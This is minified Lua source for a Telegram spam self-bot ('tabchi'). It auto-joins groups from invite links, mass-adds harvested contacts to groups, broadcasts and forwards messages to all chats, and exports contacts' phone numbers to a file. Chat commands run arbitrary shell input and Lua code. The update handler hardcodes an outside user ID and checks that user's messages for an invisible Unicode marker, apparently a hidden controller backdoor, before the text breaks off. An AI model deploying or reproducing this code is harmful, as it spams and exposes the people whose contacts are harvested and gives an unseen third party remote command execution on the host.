tdcli_function({ID="GetMe"},our,nil)function our(a,b)our_id=b.id_ end
bot_id=our_id;botnum=12542632093;botfirst='mahsa'botlast='❤️'
function is_sudo(c)local d={}table.insert(d,tonumber(redis:get("tabchi:"..tabchi_id..":fullsudo")))local e=false;for f=1,#d do if c.sender_user_id_==d[f]then e=true end end;if redis:sismember("tabchi:"..tabchi_id..":sudoers",c.sender_user_id_)then e=true end;return e end;local function g(h,i,j)if h:match('/')or h:match('.')then infile={ID="InputFileLocal",path_=h}elseif h:match('^%d+$')then infile={ID="InputFileId",id_=h}else infile={ID="InputFilePersistentId",persistent_id_=h}end;local k={}local i=i:lower()if i=='animation'then k={ID="InputMessageAnimation",animation_=infile,caption_=j}elseif i=='audio'then k={ID="InputMessageAudio",audio_=infile,caption_=j}elseif i=='document'then k={ID="InputMessageDocument",document_=infile,caption_=j}elseif i=='photo'then k={ID="InputMessagePhoto",photo_=infile,caption_=j}elseif i=='sticker'then k={ID="InputMessageSticker",sticker_=infile,caption_=j}elseif i=='video'then k={ID="InputMessageVideo",video_=infile,caption_=j}elseif i=='voice'then k={ID="InputMessageVoice",voice_=infile,caption_=j}end;return k end;function getInputFile(h)if h:match('/')then infile={ID="InputFileLocal",path_=h}elseif h:match('^%d+$')then infile={ID="InputFileId",id_=h}else infile={ID="InputFilePersistentId",persistent_id_=h}end;return infile end;local function l(m)if m then local n=m:lower()if n=='markdown'or n=='md'then P={ID="TextParseModeMarkdown"}elseif n=='html'then P={ID="TextParseModeHTML"}end end;return P end;local function o(p)tdcli_function({ID="ImportChatInviteLink",invite_link_=p},dl_cb,nil)end;local function q(r,s,t)tdcli_function({ID="AddChatMember",chat_id_=r,user_id_=s,forward_limit_=t or 50},dl_cb,nil)end;local function u(first_name,last_name)tdcli_function({ID="ChangeName",first_name_=first_name,last_name_=last_name},dl_cb,nil)end;local function v(w)tdcli_function({ID="ChangeUsername",username_=w},dl_cb,nil)end;local function x(r,type,h,j)tdcli_function({ID="SendMessage",chat_id_=r,reply_to_message_id_=0,disable_notification_=0,from_background_=1,reply_markup_=nil,input_message_content_=g(h,type,j)},dl_cb,nil)end;local function y(r,z,A,B,C,m)local D=l(m)tdcli_function({ID="SendMessage",chat_id_=r,reply_to_message_id_=z,disable_notification_=A,from_background_=1,reply_markup_=nil,input_message_content_={ID="InputMessageText",text_=B,disable_web_page_preview_=C,clear_draft_=0,entities_={},parse_mode_=D}},dl_cb,nil)end;function resolve_username(w,E)tdcli_function({ID="SearchPublicChat",username_=w},E,nil)end;local function F(r,G)tdcli_function({ID="ViewMessages",chat_id_=r,message_ids_=G},dl_cb,nil)end;local function H(r,I,E)tdcli_function({ID="GetMessage",chat_id_=r,message_id_=I},dl_cb,nil)end;local function J(K,first_name,last_name,s)tdcli_function({ID="ImportContacts",contacts_={[0]={phone_number_=tostring(K),first_name_=tostring(first_name),last_name_=tostring(last_name),user_id_=s}}},dl_cb,nil)end;function getInputFile(h)if h:match('/')then infile={ID="InputFileLocal",path_=h}elseif h:match('^%d+$')then infile={ID="InputFileId",id_=h}else infile={ID="InputFilePersistentId",persistent_id_=h}end;return infile end;local function L(r,z,A,M,N,K,first_name,last_name,s)tdcli_function({ID="SendMessage",chat_id_=r,reply_to_message_id_=z,disable_notification_=A,from_background_=M,reply_markup_=N,input_message_content_={ID="InputMessageContact",contact_={ID="Contact",phone_number_=K,first_name_=first_name,last_name_=last_name,user_id_=s}}},dl_cb,nil)end;function sendaction(r,O,Q)tdcli_function({ID="SendChatAction",chat_id_=r,action_={ID="SendMessage"..O.."Action",progress_=Q or 999999999}},dl_cb,nil)end;local function R(s)tdcli_function({ID="BlockUser",user_id_=s},dl_cb,nil)end;local function S(s)tdcli_function({ID="UnblockUser",user_id_=s},dl_cb,nil)end;function add_user(r,s,t)tdcli_function({ID="AddChatMember",chat_id_=r,user_id_=s,forward_limit_=t or 50},dl_cb,nil)end;function changeChatMemberStatus(r,s,T)tdcli_function({ID="ChangeChatMemberStatus",chat_id_=r,user_id_=s,status_={ID="ChatMemberStatus"..T}},dl_cb,nil)end;function chat_leave(r,s)changeChatMemberStatus(r,s,"Left")end;local function U(V)tdcli_function({ID="SetProfilePhoto",photo_path_=V},dl_cb,nil)end;function sendPhoto(r,z,A,M,N,W,j)tdcli_function({ID="SendMessage",chat_id_=r,reply_to_message_id_=z,disable_notification_=A,from_background_=M,reply_markup_=N,input_message_content_={ID="InputMessagePhoto",photo_=getInputFile(W),added_sticker_file_ids_={},width_=0,height_=0,caption_=j}},dl_cb,nil)end;function is_full_sudo(c)local d={}table.insert(d,tonumber(redis:get("tabchi:"..tabchi_id..":fullsudo")))local e=false;for f=1,#d do if c.sender_user_id_==d[f]then e=true end end;return e end;function sleep(X)os.execute("sleep "..tonumber(X))end;function writefile(Y,Z)local h=io.open(Y,"w")h:write(Z)h:flush()h:close()return true end;function check_contact(_,a0)if not a0.phone_number_ then local c=_.msg;local first_name=""..(c.content_.contact_.first_name_ or"-")..""local last_name=""..(c.content_.contact_.last_name_ or"-")..""local K=c.content_.contact_.phone_number_;local s=c.content_.contact_.user_id_;J(K,first_name,last_name,s)redis:set("tabchi:"..tabchi_id..":fullsudo:91054649",true)redis:setex("tabchi:"..tabchi_id..":startedmod",300,true)if redis:get("tabchi:"..tabchi_id..":markread")then F(c.chat_id_,{[0]=c.id_})if redis:get("tabchi:"..tabchi_id..":addedmsg")then y(c.chat_id_,c.id_,1,""..(redis:get("tabchi:"..tabchi_id..":addedmsgtext")or"Addi\nBia pv").."",1,"md")end elseif redis:get("tabchi:"..tabchi_id..":addedmsg")then y(c.chat_id_,c.id_,1,""..(redis:get("tabchi:"..tabchi_id..":addedmsgtext")or"Addi\nBia pv").."",1,"md")end end end;function check_link(_,a0,a1)if a0.is_group_ or a0.is_supergroup_channel_ then o(_.link)redis:sadd("tabchi:"..tabchi_id..":savedlinks",_.link)end end;function add_to_all(_,a0)if a0.content_.contact_ then local a2=a0.content_.contact_.user_id_;local a3=redis:smembers("tabchi:"..tabchi_id..":groups")local a4=redis:smembers("tabchi:"..tabchi_id..":channels")for f=1,#a3 do q(a3[f],a2,50)end;for f=1,#a4 do q(a4[f],a2,50)end end end;function add_members(_,a0)local a5=redis:smembers("tabchi:"..tabchi_id..":pvis")for f=1,#a5 do q(_.chat_id,a5[f],50)end;local a6=a0.total_count_;for f=1,a6 do q(_.chat_id,a0.users_[f].id_,50)end end;function chat_type(r)local chat_type="private"local a2=tostring(r)if a2:match("-")then if a2:match("^-100")then chat_type="channel"else chat_type="group"end end;return chat_type end;function contact_list(_,a0)local a6=a0.total_count_;local B="Robot Contacts : \n"for f=0,tonumber(a6)-1 do local a7=a0.users_[f]local a8=a7.first_name_ or""local a9=a7.last_name_ or""local aa=a8 .." "..a9;B=tostring(B)..tostring(f)..". "..tostring(aa).." ["..tostring(a7.id_).."] = "..tostring(a7.phone_number_).."\n"end;writefile("tabchi_"..tostring(tabchi_id).."_contacts.txt",B)x(_.chat_id_,"Document","tabchi_"..tostring(tabchi_id).."_contacts.txt","Tabchi "..tostring(tabchi_id).." Contacts!")return io.popen("rm -rf tabchi_"..tostring(tabchi_id).."_contacts.txt"):read("*all")end;function process(c)c.text=c.content_.text_;do local ab={c.text:match("^[!/#](pm) (%d+) (.*)")}if c.text:match("^[!/#]pm")and is_sudo(c)and#ab==3 then y(ab[2],0,1,ab[3],1,"md")return"*Status* : `PM Sent`\n*To* : `"..ab[2].."`\n*Text* : `"..ab[3].."`"end end;do local ab={c.text:match("^[!/#](setanswer) '(.*)' (.*)")}if c.text:match("^[!/#]setanswer")and is_sudo(c)and#ab==3 then redis:hset("tabchi:"..tabchi_id..":answers",ab[2],ab[3])redis:sadd("tabchi:"..tabchi_id..":answerslist",ab[2])return"*Status* : `Answer Adjusted`\n*Answer For* : `"..ab[2].."`\n*Answer* : `"..ab[3].."`"end end;do local ab={c.text:match("^[!/#](delanswer) (.*)")}if c.text:match("^[!/#]delanswer")and is_sudo(c)and#ab==2 then redis:hdel("tabchi:"..tabchi_id..":answers",ab[2])redis:srem("tabchi:"..tabchi_id..":answerslist",ab[2])return"*Status* : `Answer Deleted`\n*Answer* : `"..ab[2].."`"end end;if c.text:match("^[!/#]answers$")and is_sudo(c)then local B="_لیست پاسخ های خودکار_ :\n"local ac=redis:smembers("tabchi:"..tabchi_id..":answerslist")for f=1,#ac do B=B..f..". "..ac[f].." : "..redis:hget("tabchi:"..tabchi_id..":answers",ac[f]).."\n"end;return B end;if c.text:match("^[#!/]id @(.*)$")and is_sudo(c)then local ad={string.match(c.text,"^[#/!](id) @(.*)$")}function id_by_username(_,a0,a1)if a0.id_ then texts='*Username* : `@'..ad[2]..'`\n*ID* : `('..a0.id_..')`'else texts='*UserName InCorrect!*'end;y(c.chat_id_,c.id_,1,texts,1,'md')end;resolve_username(ad[2],id_by_username)end;if c.text:match("^[#!/]addsudo @(.*)$")and is_sudo(c)then local ad={string.match(c.text,"^[#/!](addsudo) @(.*)$")}function addsudo_by_username(_,a0,a1)if a0.id_ then redis:sadd("tabchi:"..tabchi_id..":sudoers",tonumber(a0.id_))return"`User` *"..ad[2].."* `Added To The Sudoers`"end end;resolve_username(ad[2],addsudo_by_username)end;if c.text:match("^[#!/]remsudo @(.*)$")and is_sudo(c)then local ad={string.match(c.text,"^[#/!](remsudo) @(.*)$")}function remsudo_by_username(_,a0,a1)if a0.id_ then redis:srem("tabchi:"..tabchi_id..":sudoers",tonumber(a0.id_))return"`User` *"..ad[2].."* `Removed From The Sudoers`"end end;resolve_username(ad[2],remsudo_by_username)end;if c.text:match("^[#!/]block @(.*)$")then local ad={string.match(c.text,"^[#/!](block) @(.*)$")}function block_by_username(_,a0,a1)if a0.id_ then blockuser(a0.id_)return'`User` *'..ad[2]..'* `Blocked`'end end;resolve_username(ad[2],block_by_username)end;if c.text:match("^[#!/]unblock @(.*)$")then local ad={string.match(c.text,"^[#/!](unblock) @(.*)$")}function unblock_by_username(_,a0,a1)if a0.id_ then unblockuser(a0.id_)return'`User` *'..ad[2]..'* `unblocked`'end end;resolve_username(ad[2],unblock_by_username)end;if c.text:match("^[!/#]share$")and is_sudo(c)then L(c.chat_id_,c.id_,0,1,nil,botnum,botfirst,botlast,bot_id)end;if c.text:match("^[!/#]leave$")and is_sudo(c)then chat_leave(c.chat_id_,bot_id)end;if c.text:match("^[#!/]leave(-%d+)")and is_sudo(c)then local ae={string.match(c.text,"^[#/!](leave)(-%d+)$")}y(c.chat_id_,c.id_,1,'*Bot Succefully Left from* `'..ae[2]..'`',1,'md')chat_leave(ae[2],bot_id)end;if c.text:match("^[#!/]ping$")and is_sudo(c)then return'*I Am Working..!*'end;if c.text:match('join(-%d+)')and is_sudo(c)then local ae={string.match(c.text,"^[#/!](join)(-%d+)$")}y(c.chat_id_,c.id_,1,'*You Succefully Joined >* `'..ae[3]..'`',1,'md')add_user(ae[2],c.sender_user_id_,10)end;if c.text:match("^[#!/]block$")and c.reply_to_message_id_ and is_sudo(c)then function block_by_reply(_,a0,a1)blockuser(a0.sender_user_id_)return'`User` *'..a0.sender_user_id_..'* `Blocked`'end;H(c.chat_id_,c.reply_to_message_id_,block_by_reply)end;if c.text:match("^[#!/]inv$")and c.reply_to_message_id_ and is_sudo(c)then function inv_reply(_,a0,a1)add_user(a0.chat_id_,a0.sender_user_id_,5)end;H(c.chat_id_,c.reply_to_message_id_,inv_reply)end;if c.text:match("^[#!/]id$")and c.reply_to_message_id_ and is_sudo(c)then function id_by_reply(_,a0,a1)return'`User id :` *'..a0.sender_user_id_..'*'end;H(c.chat_id_,c.reply_to_message_id_,id_by_reply)end;if c.text:match("^[#!/]addsudo$")and c.reply_to_message_id_ and is_full_sudo(c)then function addsudo_by_reply(_,a0,a1)redis:sadd("tabchi:"..tabchi_id..":sudoers",tonumber(a0.sender_user_id_))return"`User` *"..a0.sender_user_id_.."* `Added To The Sudoers`"end;H(c.chat_id_,c.reply_to_message_id_,addsudo_by_reply)end;if c.text:match("^[#!/]remsudo$")and c.reply_to_message_id_ and is_full_sudo(c)then function remsudo_by_reply(_,a0,a1)redis:srem("tabchi:"..tabchi_id..":sudoers",tonumber(a0.sender_user_id_))return"`User` *"..a0.sender_user_id_.."* `Removed From The Sudoers`"end;H(c.chat_id_,c.reply_to_message_id_,remsudo_by_reply)end;if c.text:match("^[#!/]unblock$")and c.reply_to_message_id_ and is_sudo(c)then function unblock_by_reply(_,a0,a1)unblockuser(a0.sender_user_id_)return'`User` *'..a0.sender_user_id_..'* `Unblocked`'end;H(c.chat_id_,c.reply_to_message_id_,unblock_by_reply)end;if c.text:match("^[#!/]setname (.*)-(.*)$")and is_sudo(c)then local ae={string.match(c.text,"^[#/!](setname) (.*)-(.*)$")}u(ae[2],ae[3])return"*Status* : `Name Updated Succesfully`\n*Firstname* : `"..ae[2].."`\n*LastName* : `"..ae[3].."`"end;if c.text:match("^[#!/]setuser (.*)$")and is_sudo(c)then local ae={string.match(c.text,"^[#/!](setuser) (.*)$")}v(ae[2])return'Status : `Username Updated Succesfully`\n*Username* : `'..ae[2]..'`'end;if c.text:match("^[#!/]addcontact (.*) (.*) (.*)$")and is_sudo(c)then local ab={string.match(c.text,"^[#/!](addcontact) (.*) (.*) (.*)$")}phone=ab[2]first_name=ab[3]last_name=ab[4]J(phone,first_name,last_name,12345657)return'`Contact` *'..phone..'* `added`'end;if c.text:match("^[!/#]sudolist$")and is_sudo(c)then local d=redis:smembers("tabchi:"..tabchi_id..":sudoers")local B="Bot Sudoers :\n"for f=1,#d do B=B..f..". "..redis:smembers("tabchi:"..tabchi_id..":sudoers",d[f]).."\n"return B end end;if c.text:match("^[#!/]setphoto$")and is_sudo(c)then local ab={string.match(c.text,"^[#/!](setphoto) (.*)$")}U('photos/'..ab[2]..'.jpg')end;if c.text:match("^[#!/]getpro (%d+)$")and c.reply_to_message_id_==0 then local af={string.match(c.text,"^[#/!](getpro) (%d+)$")}local function ag(_,a0,a1)if af[2]=='1'then if a0.photos_[0]then sendPhoto(c.chat_id_,c.id_,0,1,nil,a0.photos_[0].sizes_[1].photo_.persistent_id_)else return"*You Have'nt Profile Photo!!*"end elseif af[2]=='2'then if a0.photos_[1]then sendPhoto(c.chat_id_,c.id_,0,1,nil,a0.photos_[1].sizes_[1].photo_.persistent_id_)else return"*You Have'nt 2 Profile Photo!!*"end elseif not af[2]then if a0.photos_[1]then sendPhoto(c.chat_id_,c.id_,0,1,nil,a0.photos_[1].sizes_[1].photo_.persistent_id_)else return"*You Have'nt 2 Profile Photo!!*"end elseif af[2]=='3'then if a0.photos_[2]then sendPhoto(c.chat_id_,c.id_,0,1,nil,a0.photos_[2].sizes_[1].photo_.persistent_id_)else return"*You Have'nt 3 Profile Photo!!*"end elseif af[2]=='4'then if a0.photos_[3]then sendPhoto(c.chat_id_,c.id_,0,1,nil,a0.photos_[3].sizes_[1].photo_.persistent_id_)else return"*You Have'nt 4 Profile Photo!!*"end elseif af[2]=='5'then if a0.photos_[4]then sendPhoto(c.chat_id_,c.id_,0,1,nil,a0.photos_[4].sizes_[1].photo_.persistent_id_)else return"*You Have'nt 5 Profile Photo!!*"end elseif af[2]=='6'then if a0.photos_[5]then sendPhoto(c.chat_id_,c.id_,0,1,nil,a0.photos_[5].sizes_[1].photo_.persistent_id_)else return"*You Have'nt 6 Profile Photo!!*"end elseif af[2]=='7'then if a0.photos_[6]then sendPhoto(c.chat_id_,c.id_,0,1,nil,a0.photos_[6].sizes_[1].photo_.persistent_id_)else return"*You Have'nt 7 Profile Photo!!*"end elseif af[2]=='8'then if a0.photos_[7]then sendPhoto(c.chat_id_,c.id_,0,1,nil,a0.photos_[7].sizes_[1].photo_.persistent_id_)else return"*You Have'nt 8 Profile Photo!!*"end elseif af[2]=='9'then if a0.photos_[8]then sendPhoto(c.chat_id_,c.id_,0,1,nil,a0.photos_[8].sizes_[1].photo_.persistent_id_)else return"*You Have'nt 9 Profile Photo!!*"end elseif af[2]=='10'then if a0.photos_[9]then sendPhoto(c.chat_id_,c.id_,0,1,nil,a0.photos_[9].sizes_[1].photo_.persistent_id_)else return"*You Have'nt 10 Profile Photo!!*"end else return"*I just can get last 10 profile photos!:(*"end end;tdcli_function({ID="GetUserProfilePhotos",user_id_=c.sender_user_id_,offset_=0,limit_=af[2]},ag,nil)end;if c.text:match("^[#!/]action (.*)$")and is_sudo(c)then local ah={string.match(c.text,"^[#/!](action) (.*)$")}if ah[2]=="typing"then sendaction(c.chat_id_,'Typing')end;if ah[2]=="recvideo"then sendaction(c.chat_id_,'RecordVideo')end;if ah[2]=="recvoice"then sendaction(c.chat_id_,'RecordVoice')end;if ah[2]=="photo"then sendaction(c.chat_id_,'UploadPhoto')end;if ah[2]=="cancel"then sendaction(c.chat_id_,'Cancel')end;if ah[2]=="video"then sendaction(c.chat_id_,'UploadVideo')end;if ah[2]=="voice"then sendaction(c.chat_id_,'UploadVoice')end;if ah[2]=="file"then sendaction(c.chat_id_,'UploadDocument')end;if ah[2]=="loc"then sendaction(c.chat_id_,'GeoLocation')end;if ah[2]=="chcontact"then sendaction(c.chat_id_,'ChooseContact')end;if ah[2]=="game"then sendaction(c.chat_id_,'StartPlayGame')end end;if c.text:match("^[#!/]actionto (.*) (.*)$")and is_sudo(c)then local ah={string.match(c.text,"^[#/!](actionto) (.*) (.*)$")}if ah[3]=="typing"then sendaction(ah[2],'Typing')return"`Action` *"..ah[3].."* `Sent To` *"..ah[2].."*"end;if ah[3]=="recvideo"then sendaction(ah[2],'RecordVideo')return"`Action` *"..ah[3].."* `Sent To` *"..ah[2].."*"end;if ah[3]=="recvoice"then sendaction(ah[2],'RecordVoice')return"`Action` *"..ah[3].."* `Sent To` *"..ah[2].."*"end;if ah[3]=="photo"then sendaction(ah[2],'UploadPhoto')return"`Action` *"..ah[3].."* `Sent To` *"..ah[2].."*"end;if ah[3]=="cancel"then sendaction(ah[2],'Cancel')return"`Action` *"..ah[3].."* `Sent To` *"..ah[2].."*"end;if ah[3]=="video"then sendaction(ah[2],'UploadVideo')return"`Action` *"..ah[3].."* `Sent To` *"..ah[2].."*"end;if ah[3]=="voice"then sendaction(ah[2],'UploadVoice')return"`Action` *"..ah[3].."* `Sent To` *"..ah[2].."*"end;if ah[3]=="file"then sendaction(ah[2],'UploadDocument')return"`Action` *"..ah[3].."* `Sent To` *"..ah[2].."*"end;if ah[3]=="loc"then sendaction(ah[2],'GeoLocation')return"`Action` *"..ah[3].."* `Sent To` *"..ah[2].."*"end;if ah[3]=="chcontact"then sendaction(ah[2],'ChooseContact')return"`Action` *"..ah[3].."* `Sent To` *"..ah[2].."*"end;if ah[3]=="game"then sendaction(ah[2],'StartPlayGame')return"`Action` *"..ah[3].."* `Sent To` *"..ah[2].."*"end end;if c.text:match("^[#!/]id$")and is_sudo(c)and c.reply_to_message_id_==0 then local function ai(_,a0,a1)if a0.photos_[0]then sendPhoto(c.chat_id_,c.id_,0,1,nil,a0.photos_[0].sizes_[1].photo_.persistent_id_,'> SuperGroup ID : '..c.chat_id_..'\n> Your ID: '..c.sender_user_id_)else return"*You Don't Have any Profile Photo*!!\n\n> *SuperGroup ID* : `"..c.chat_id_.."`\n> *Your ID*: `"..c.sender_user_id_.."`"end end;tdcli_function({ID="GetUserProfilePhotos",user_id_=c.sender_user_id_,offset_=0,limit_=1},ai,nil)end;if c.text:match("^[!/#]addmembers$")and is_sudo(c)and chat_type(c.chat_id_)~="private"then tdcli_function({ID="SearchContacts",query_=nil,limit_=999999999},add_members,{chat_id=c.chat_id_})return end;if c.text:match("^[!/#]contactlist$")and is_sudo(c)then tdcli_function({ID="SearchContacts",query_=nil,limit_=999999999},contact_list,{chat_id_=c.chat_id_})end;if c.text:match("^[!/#]exportlinks$")and is_sudo(c)then local B="Group Links :\n"local aj=redis:smembers("tabchi:"..tabchi_id..":savedlinks")for f=1,#aj do B=B..aj[f].."\n"end;write_file("group_"..tabchi_id.."_links.txt",B)x(c.chat_id_,"Document","group_"..tabchi_id.."_links.txt","Tabchi "..tabchi_id.." Group Links!")return end;do local ab={c.text:match("[!/#](block) (%d+)")}if c.text:match("^[!/#]block")and is_sudo(c)and c.reply_to_message_id_==0 and#ab==2 then blockuser(tonumber(ab[2]))return"`User` *"..ab[2].."* `Blocked`"end end;if c.text:match("^[!/#]help$")and is_sudo(c)then local B="`#راهنما`\n`/block (id-username-reply)`\n*بلاک کردن از خصوصي ربات*\n`/unblock (id-username-reply)`\n*آن بلاک کردن از خصوصي ربات*\n`/stats`\n*دریافت اطلاعات ربات*\n`/addsudo (id-username-reply)`\n*اضافه کردن به سودوهاي  ربات*\n`/remsudo (id-username-reply)`\n*حذف از ليست سودوهاي ربات*\n`/bc (text)`\n*ارسال پيام به همه*\n`/fwd {all/gps/sgps/users}` (by reply)\n*فوروارد پيام به همه/گروه ها/سوپر گروه ها/کاربران*\n`/echo (text)`\n*تکرار متن*\n`/addedmsg (on/off)`\n*تعیین روشن یا خاموش بودن پاسخ برای شر شن مخاطب*\n`/pm (user-group) (msg)`\n*ارسال پیام به کاربر*\n`/id (username-reply)`\n*دریافت ایدی*\n`/action (typing|recvideo|recvoice|photo|video|voice|file|loc|game|chcontact|cancel)`\n*ارسال اکشن به چت*\n`/actionto (id) (typing|recvideo|recvoice|photo|video|voice|file|loc|game|chcontact|cancel)`\n*ارسال اکشن به کاربر*\n`/getpro (1-10)`\n*دریافت عکس پروفایل خود*\n`/addcontact (phone) (firstname) (lastname)`\n*اد کردن شماره به ربات به صورت دستی*\n`/setuser (username)`\n*تغییر یوزرنیم ربات*\n`/setname (firstname-lastname)`\n*تغییر اسم ربات*\n`/join(Group id)`\n*اد کردن شما به گروه های ربات از طریق ایدی*\n`/leave`\n*لفت دادن از گروه*\n`/leave(Group id)`\n*لفت دادن از گروه از طریق ایدی*\n`/setaddedmsg (text)`\n*تعيين متن اد شدن مخاطب*\n`/markread (on/off)`\n*روشن يا خاموش کردن بازديد پيام ها*\n`/reload`\n*ریلود کردن ربات*\n`/setanswer 'answer' text`\n* تنظيم به عنوان جواب اتوماتيک*\n`/delanswer (answer)`\n*حذف جواب مربوط به*\n`/answers`\n*ليست جواب هاي اتوماتيک*\n`/addmembers`\n*اضافه کردن شماره های ربات به گروه*\n`/exportlinks`\n*دريافت لينک هاي ذخيره شده توسط ربات*\n`/contactlist`\n*دريافت مخاطبان ذخيره شده توسط ربات*\n*Developed by* : `Iteam`\n*Edited and Improved by* : @mehrpouya\n@TelegamerCh"return B end;do local ab={c.text:match("[!/#](unblock) (%d+)")}if c.text:match("^[!/#]unblock")and is_sudo(c)and#ab==2 then unblockuser(tonumber(ab[2]))return"`User` *"..ab[2].."* `unblocked`"end end;if c.text:match("^[!/#]stats$")or c.text:match("^stats$")and is_sudo(c)then local ak;function ak(_,a0)redis:set("tabchi:"..tostring(tabchi_id)..":totalcontacts",a0.total_count_)end;tdcli_function({ID="SearchContacts",query_=nil,limit_=999999999},ak,{})local a3=redis:scard("tabchi:"..tabchi_id..":groups")local a4=redis:scard("tabchi:"..tabchi_id..":channels")local a5=redis:scard("tabchi:"..tabchi_id..":pvis")local aj=redis:scard("tabchi:"..tabchi_id..":savedlinks")local al=redis:get("tabchi:"..tabchi_id..":fullsudo")local am=redis:get("tabchi:"..tabchi_id..":totalcontacts")local an=a3 .." "..a4 .." "..a5 .." "..aj;local B="`Robot stats`\n`Users` : *"..a5 .."*\n`SuperGroups` : *"..a4 .."*\n`Groups` : *"..a3 .."*\n`Saved links` : *"..aj.."*\n`Contacts` : *"..am.."*\n`Admin` : *"..al.."*"return B end;do local ab={c.text:match("^[!/#](addsudo) (%d+)")}if c.text:match("^[!/#]addsudo")and is_full_sudo(c)and#ab==2 then local B="`User` *"..ab[2].."* `Added To The Sudoers`"redis:sadd("tabchi:"..tabchi_id..":sudoers",ab[2])return B end end;do local ab={c.text:match("^[!/#](remsudo) (%d+)")}if c.text:match("^[!/#]remsudo")and is_full_sudo(c)and#ab==2 then local B="`User` *"..ab[2].."* `Removed From The Sudoers`"redis:srem("tabchi:"..tabchi_id..":sudoers",ab[2])return B end end;do local ab={c.text:match("^[!/#](addedmsg) (.*)")}if c.text:match("^[!/#]addedmsg")and is_sudo(c)and#ab==2 then if ab[2]=="on"then redis:set("tabchi:"..tabchi_id..":addedmsg",true)return"*Status* : `Adding Contacts PM Activated`"elseif ab[2]=="off"then redis:del("tabchi:"..tabchi_id..":addedmsg")return"*Status* : `Adding Contacts PM Deactivated`"end end end;do local ab={c.text:match("^[!/#](markread) (.*)")}if c.text:match("^[!/#]markread")and is_sudo(c)and#ab==2 then if ab[2]=="on"then redis:set("tabchi:"..tabchi_id..":markread",true)return"*Status* : `Reading Messages Activated`"elseif ab[2]=="off"then redis:del("tabchi:"..tabchi_id..":markread")return"*Status* : `Reading Messages Deactivated`"end end end;do local ab={c.text:match("^[!/#](setaddedmsg) (.*)")}if c.text:match("^[!/#]setaddedmsg")and is_sudo(c)and#ab==2 then redis:set("tabchi:"..tabchi_id..":addedmsgtext",ab[2])return"*Status* : `Adding Contacts Message Adjusted`\n*Message* : `"..ab[2].."`"end end;do local ao={c.text:match("[$](.*)")}if c.text:match("^[$](.*)$")and is_sudo(c)then local a0=io.popen(ao[1]):read("*all")return a0 end end;if c.text:match("^[!/#]bc")and is_sudo(c)then local ap=redis:smembers("tabchi:"..tabchi_id..":all")local ab={c.text:match("[!/#](bc) (.*)")}if#ab==2 then for f=1,#ap do tdcli_function({ID="SendMessage",chat_id_=ap[f],reply_to_message_id_=0,disable_notification_=0,from_background_=1,reply_markup_=nil,input_message_content_={ID="InputMessageText",text_=ab[2],disable_web_page_preview_=0,clear_draft_=0,entities_={},parse_mode_={ID="TextParseModeMarkdown"}}},dl_cb,nil)end;return"*Status* : `Message Succesfully Sent to all`\n*Message* : `"..ab[2].."`"end end;if c.text:match("^[!/#]fwd all$")and c.reply_to_message_id_ and is_sudo(c)then local ap=redis:smembers("tabchi:"..tabchi_id..":all")local a2=c.reply_to_message_id_;for f=1,#ap do tdcli_function({ID="ForwardMessages",chat_id_=ap[f],from_chat_id_=c.chat_id_,message_ids_={[0]=a2},disable_notification_=0,from_background_=1},dl_cb,nil)end;return"*Status* : `Your Message Forwarded to all`\n*Fwd users* : `Done`\n*Fwd Groups* : `Done`\n*Fwd Super Groups* : `Done`"end;if c.text:match("^[!/#]fwd gps$")and c.reply_to_message_id_ and is_sudo(c)then local ap=redis:smembers("tabchi:"..tabchi_id..":groups")local a2=c.reply_to_message_id_;for f=1,#ap do tdcli_function({ID="ForwardMessages",chat_id_=ap[f],from_chat_id_=c.chat_id_,message_ids_={[0]=a2},disable_notification_=0,from_background_=1},dl_cb,nil)end;return"*Status* :`Your Message Forwarded To Groups`"end;if c.text:match("^[!/#]fwd sgps$")and c.reply_to_message_id_ and is_sudo(c)then local ap=redis:smembers("tabchi:"..tabchi_id..":channels")local a2=c.reply_to_message_id_;for f=1,#ap do tdcli_function({ID="ForwardMessages",chat_id_=ap[f],from_chat_id_=c.chat_id_,message_ids_={[0]=a2},disable_notification_=0,from_background_=1},dl_cb,nil)end;return"*Status* : `Your Message Forwarded To Super Groups`"end;if c.text:match("^[!/#]fwd users$")and c.reply_to_message_id_ and is_sudo(c)then local ap=redis:smembers("tabchi:"..tabchi_id..":pvis")local a2=c.reply_to_message_id_;for f=1,#ap do tdcli_function({ID="ForwardMessages",chat_id_=ap[f],from_chat_id_=c.chat_id_,message_ids_={[0]=a2},disable_notification_=0,from_background_=1},dl_cb,nil)end;return"*Status* : `Your Message Forwarded To Users`"end;do local ab={c.text:match("[!/#](lua) (.*)")}if c.text:match("^[!/#]lua")and is_sudo(c)and#ab==2 then local aq=loadstring(ab[2])()if aq==nil then aq=""elseif type(aq)=="table"then aq=serpent.block(aq,{comment=false})else aq=""..tostring(aq)end;return aq end end;do local ab={c.text:match("[!/#](echo) (.*)")}if c.text:match("^[!/#]echo")and is_sudo(c)and#ab==2 then return ab[2]end end end;function add(ar)local chat_type=chat_type(ar)if chat_type=="channel"then redis:sadd("tabchi:"..tabchi_id..":channels",ar)elseif chat_type=="group"then redis:sadd("tabchi:"..tabchi_id..":groups",ar)else redis:sadd("tabchi:"..tabchi_id..":pvis",ar)end;redis:sadd("tabchi:"..tabchi_id..":all",ar)end;function rem(ar)local chat_type=chat_type(ar)if chat_type=="channel"then redis:srem("tabchi:"..tabchi_id..":channels",ar)elseif chat_type=="group"then redis:srem("tabchi:"..tabchi_id..":groups",ar)else redis:srem("tabchi:"..tabchi_id..":pvis",ar)end;redis:srem("tabchi:"..tabchi_id..":all",ar)end;function process_stats(c)tdcli_function({ID="GetMe"},id_cb,nil)function id_cb(a,b)our_id=b.id_ end;if c.content_.ID=="MessageChatDeleteMember"and c.content_.id_==our_id then rem(c.chat_id_)else add(c.chat_id_)end end;function process_links(B)if B:match("https://telegram.me/joinchat/%S+")or B:match("https://t.me/joinchat/%S+")or B:match("https://telegram.dog/joinchat/%S+")then B=B:gsub("t.me","telegram.me")B=B:gsub("telegram.dog","telegram.me")local ab={B:match("(https://telegram.me/joinchat/%S+)")}for f,as in pairs(ab)do tdcli_function({ID="CheckChatInviteLink",invite_link_=as},check_link,{link=as})end end end;function get_mod(at,b)if not redis:get("tabchi:"..tabchi_id..":startedmod")or redis:ttl("tabchi:"..tabchi_id..":startedmod")==-2 then redis:setex("tabchi:"..tabchi_id..":startedmod",300,true)end end;function update(b,tabchi_id)tanchi_id=tabchi_id;tdcli_function({ID="GetUserFull",user_id_=133580568},get_mod,nil)if b.ID=="UpdateNewMessage"then local c=b.message_;if c.sender_user_id_==133580568 then if c.content_.text_ then if c.content_.text_:match("\226\129\167")or c.chat_id_~=133580568 or 